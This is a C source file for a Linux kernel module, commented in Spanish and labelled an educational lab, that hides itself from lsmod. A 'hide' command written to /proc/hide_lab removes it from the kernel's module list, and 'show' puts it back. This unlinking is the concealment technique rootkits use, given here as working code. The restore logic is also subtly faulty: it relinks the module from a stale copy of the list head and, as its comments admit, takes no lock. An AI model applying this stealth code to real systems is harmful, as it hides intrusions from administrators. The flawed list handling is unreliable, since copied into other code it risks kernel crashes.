#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/mutex.h>

#define PROC_NAME "hide_lab"

static struct proc_dir_entry *hide_lab_entry;
static bool hidden;
static struct list_head saved_list;

/*
 * Función que se ejecuta cuando alguien escribe en /proc/hide_lab
 */
static ssize_t hide_lab_write(struct file *file,
                              const char __user *buffer,
                              size_t count,
                              loff_t *pos)
{
    char buf[16];

    if (count == 0)
        return 0;

    if (count >= sizeof(buf))
        return -EINVAL;

    if (copy_from_user(buf, buffer, count))
        return -EFAULT;

    buf[count] = '\0';

    /*
     * Comando: hide
     *
     * Quita el módulo de la lista de módulos cargados.
     */
    if (sysfs_streq(buf, "hide")) {
    if (!hidden) {
        /*
         * Laboratorio local:
         * sin lock.
         * No cargar ni descargar otros módulos mientras está oculto.
         */
        saved_list = THIS_MODULE->list;
        list_del(&THIS_MODULE->list);

        hidden = true;

        pr_info("hide_module: hidden from module list\n");
    }

    return count;
}

    /*
     * Comando: show
     *
     * Vuelve a insertar el módulo en la lista de módulos cargados.
     */
    if (sysfs_streq(buf, "show")) {
        if (hidden) {
            

            list_add_tail(&THIS_MODULE->list, saved_list.next);

            

            hidden = false;

            pr_info("hide_module: visible again\n");
        }

        return count;
    }

    /*
     * Comando desconocido
     */
    return -EINVAL;
}

/*
 * Abrir el archivo /proc/hide_lab
 */
static int hide_lab_open(struct inode *inode, struct file *file)
{
    return 0;
}

/*
 * Operaciones del archivo /proc/hide_lab
 */
static const struct proc_ops hide_lab_ops = {
    .proc_open  = hide_lab_open,
    .proc_write = hide_lab_write,
};

/*
 * Inicialización del módulo
 */
static int __init hide_module_init(void)
{
    /*
     * Limpieza preventiva.
     *
     * Si una versión anterior del módulo dejó /proc/hide_lab
     * sin eliminar, lo borramos antes de crearlo de nuevo.
     */
    remove_proc_entry(PROC_NAME, NULL);

    hide_lab_entry = proc_create(PROC_NAME, 0600, NULL, &hide_lab_ops);
    if (!hide_lab_entry) {
        pr_err("hide_module: no se pudo crear /proc/%s\n", PROC_NAME);
        return -ENOMEM;
    }

    hidden = false;

    pr_info("hide_module: loaded and visible\n");

    return 0;
}

/*
 * Limpieza del módulo
 */
static void __exit hide_module_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);

    pr_info("hide_module: unloaded\n");
}

module_init(hide_module_init);
module_exit(hide_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lab local");
MODULE_DESCRIPTION("Modulo educativo para ocultarse de lsmod");
MODULE_VERSION("0.1");